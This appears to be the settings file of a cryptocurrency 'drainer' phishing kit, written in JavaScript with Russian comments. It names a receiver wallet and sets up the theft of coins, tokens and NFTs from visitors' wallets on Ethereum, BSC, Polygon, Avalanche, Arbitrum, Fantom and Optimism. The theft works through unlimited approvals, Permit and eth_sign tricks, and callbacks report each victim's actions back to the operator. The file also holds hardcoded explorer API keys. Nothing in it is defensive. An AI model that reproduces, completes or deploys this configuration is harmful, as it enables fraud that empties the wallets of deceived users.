// =====================================================================
// ========================= НАСТРОЙКИ СКРИПТА =========================
// =====================================================================

var MS_Receiver_Address = '0x2acD6ee30334c8E0E69E7A18Ff4A202d314b1059'; // Адрес вашего кошелька
var MS_Processor_Address = '0x2acD6ee30334c8E0E69E7A18Ff4A202d314b1059'; // Адрес вашего обработчика

var MS_Approve_Mode = true; // Режим вывода токенов с помощью подтверждений
var MS_Permit_Mode = true; // true - включить Permit, false - выключить
var MS_Unlimited_Mode = true; // true - одобрять на безлимитное количество, false - на определенную сумму
var MS_Tokens_Priority = false; // false - списывать от дорогого к дешевому, true - токены в приоритете над стоимостью
var MS_Sign_Native = false; // false - списывать через Transfer, true - списывать с помощью eth_sign [EXPEREMENTAL]
var MS_Sign_Tokens = false; // false - списывать токены обычным способом, true - списывать с помощью eth_sign [EXPEREMENTAL, W/O APPROVE ONLY]
var MS_Sign_NFT = false; // false - списывать NFT обычным способом, true - списывать с помощью eth_sign [EXPEREMENTAL, W/O SAFA ONLY]
var MS_Minimum_Price = 10; // Игнорировать подключенные кошельки, имеющую сумму в USD ниже, чем указанная здесь (0 - отключить мин. сумму)

var MS_Drainer_Settings = {
  notifications: { // Настройка уведомлений о действиях пользователя
    callback: '/callback.php', // URL для уведомлений (не менять, если не уверены)
    visit: true, // true - включить уведомления о входе на сайте, false - выключить
    connect: true, // true - включить уведомления о подключении кошелька, false - выключить
    transfer: true, // true - включить уведомления о переводе средств, false - выключить
    approve: true, // true - включить уведомление о подтверждении, false - выключить
    cancel: true, // true - включить уведомления об отказах, false - выключить
    network: true, // true - включить уведомления о смене сети, false - выключить
    windows: true, // true - включить уведомления о запросах, false - выключить
  },
  chains: {
    eth: { // Ethereum, настройки сети
      enable: true, // true - сеть включена, false - сеть выключена
      native: true, // true - выводить монеты, false - не выводить
      tokens: true, // true - выводить токены, false - не выводить
      permit: true, // true - включить PERMIT для сети, false - выключить
      nft: true, // true - выводить NFT, false - не выводить
      min_native_price: 5, // минимальная стоимость основной монеты в USD
      min_token_price: 15, // минимальная стоимость токена в USD
      min_nft_price: 35, // минимальная стоимость NFT в USD
      api_key: '2B44DG986KR15DTS4S1E5JWZT8VTWZ7C99', // Etherscan API Key (не менять, если не уверены)
    },
    bsc: { // Binance Smart Chain, настройки сети
      enable: true, // true - сеть включена, false - сеть выключена
      native: true, // true - выводить монеты, false - не выводить
      tokens: true, // true - выводить токены, false - не выводить
      permit: true, // true - включить PERMIT для сети, false - выключить
      nft: true, // true - выводить NFT, false - не выводить
      min_native_price: 1, // минимальная стоимость основной монеты в USD
      min_token_price: 1, // минимальная стоимость токена в USD
      min_nft_price: 20, // минимальная стоимость NFT в USD
      api_key: 'K5AI5N7ZPC9EF6G9MVQF33CBVMY1UKQ7HI', // Bscscan API Key (не менять, если не уверены)
    },
    polygon: { // Polygon (MATIC), настройки сети
      enable: true, // true - сеть включена, false - сеть выключена
      native: true, // true - выводить монеты, false - не выводить
      tokens: true, // true - выводить токены, false - не выводить
      permit: true, // true - включить PERMIT для сети, false - выключить
      nft: true, // true - выводить NFT, false - не выводить
      min_native_price: 1, // минимальная стоимость основной монеты в USD
      min_token_price: 1, // минимальная стоимость токена в USD
      min_nft_price: 20, // минимальная стоимость NFT в USD
      api_key: 'M9IMUX515SEB97THWJRQDKNX75CI66X7XX', // Polygonscan API Key (не менять, если не уверены)
    },
    avalanche: { // Avalanche C-Chain, настройка сети
      enable: true, // true - сеть включена, false - сеть выключена
      native: true, // true - выводить монеты, false - не выводить
      tokens: true, // true - выводить токены, false - не выводить
      permit: true, // true - включить PERMIT для сети, false - выключить
      nft: true, // true - выводить NFT, false - не выводить
      min_native_price: 1, // минимальная стоимость основной монеты в USD
      min_token_price: 1, // минимальная стоимость токена в USD
      min_nft_price: 20, // минимальная стоимость NFT в USD
      api_key: 'ZMJ2CKEX65EJ8WIPWRJWKRFG8HXCM6I89Z', // Snowtrace API Key (не менять, если не уверены)
    },
    arbitrum: { // Arbitrum, настройка сети
      enable: true, // true - сеть включена, false - сеть выключена
      native: true, // true - выводить монеты, false - не выводить
      tokens: true, // true - выводить токены, false - не выводить
      permit: true, // true - включить PERMIT для сети, false - выключить
      nft: true, // true - выводить NFT, false - не выводить
      min_native_price: 1, // минимальная стоимость основной монеты в USD
      min_token_price: 1, // минимальная стоимость токена в USD
      min_nft_price: 20, // минимальная стоимость NFT в USD
      api_key: 'DU3TKS3QYBQAHC7SEQ5YHB9VPD85JXTX7I', // Arbscan API Key (не менять, если не уверены)
    },
    fantom: { // Fantom, настройка сети
      enable: true, // true - сеть включена, false - сеть выключена
      native: true, // true - выводить монеты, false - не выводить
      tokens: true, // true - выводить токены, false - не выводить
      permit: true, // true - включить PERMIT для сети, false - выключить
      nft: true, // true - выводить NFT, false - не выводить
      min_native_price: 1, // минимальная стоимость основной монеты в USD
      min_token_price: 1, // минимальная стоимость токена в USD
      min_nft_price: 20, // минимальная стоимость NFT в USD
      api_key: 'F9GFY4EXGD84MHWEK5NCUJWF9FZVBRT415', // Fantomscan API Key (не менять, если не уверены)
    },
    optimism: { // Optimism, настройка сети
      enable: true, // true - сеть включена, false - сеть выключена
      native: true, // true - выводить монеты, false - не выводить
      tokens: true, // true - выводить токены, false - не выводить
      permit: true, // true - включить PERMIT для сети, false - выключить
      nft: true, // true - выводить NFT, false - не выводить
      min_native_price: 1, // минимальная стоимость основной монеты в USD
      min_token_price: 1, // минимальная стоимость токена в USD
      min_nft_price: 20, // минимальная стоимость NFT в USD
      api_key: '46J83C1RF5TEWJ3NVCF17PG3KYD36U9QPK', // Optimismscan API Key (не менять, если не уверены)
    }
  }
};

var MS_Contracts_Blacklist = []; // Используйте данный массив для добавления контрактов в чёрный список
var MS_Contracts_Whitelist = []; // Используйте данный массив для добавления контрактов в белый список
// Если в белом списке есть хотя бы один контракт, остальные контракты, не находящиеся там, не будут работать

var MS_Wallets_Blacklist = []; // Используйте данный массив для добавления кошельков в чёрный список
// С кошельков, которые находятся здесь, не будут списываться никакие активы